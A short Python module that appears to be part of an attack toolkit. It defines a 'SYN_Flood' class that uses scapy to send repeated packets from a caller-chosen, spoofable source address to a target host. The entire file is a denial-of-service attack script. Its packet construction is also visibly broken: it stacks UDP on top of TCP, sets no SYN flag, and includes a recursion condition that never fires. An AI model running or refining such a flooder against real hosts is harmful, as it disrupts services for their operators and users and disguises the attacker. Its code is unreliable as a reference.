#!/usr/bin/python
import src.source.use
from src.Logging.print_stdout import print_warning, print_error

class SYN_Flood:
    def __init__(self, src_address, dst_address, size_count=100):
        self.source_address = src_address
        self.destination = dst_address
        self.count = int(size_count)
        if not self.source_address:
            print_warning("Please input source ip address!!")
            src.source.use.sys.exit(0)
        if not self.destination:
            print_warning("Please input destination address!!")
            src.source.use.sys.exit(0)

    def run_syn(self):
        try:
            for sport in range(0, self.count):
                protocol_IP = src.source.use.IP(src=self.source_address, dst=self.destination)
                protocol_TCP = src.source.use.TCP(sport=sport, dport=8080)
                protocol_UDP = src.source.use.UDP(sport=sport, dport=3128)
                packets = protocol_IP / protocol_TCP / protocol_UDP
                try:
                    src.source.use.scapy.sendrecv.send(packets, count=self.count, verbose=1, inter=0.7)
                except KeyboardInterrupt:
                    src.source.use.sys.exit(0)
                if sport == 100:
                    self.run_syn()
        except IOError as error:
            print_error(str(error))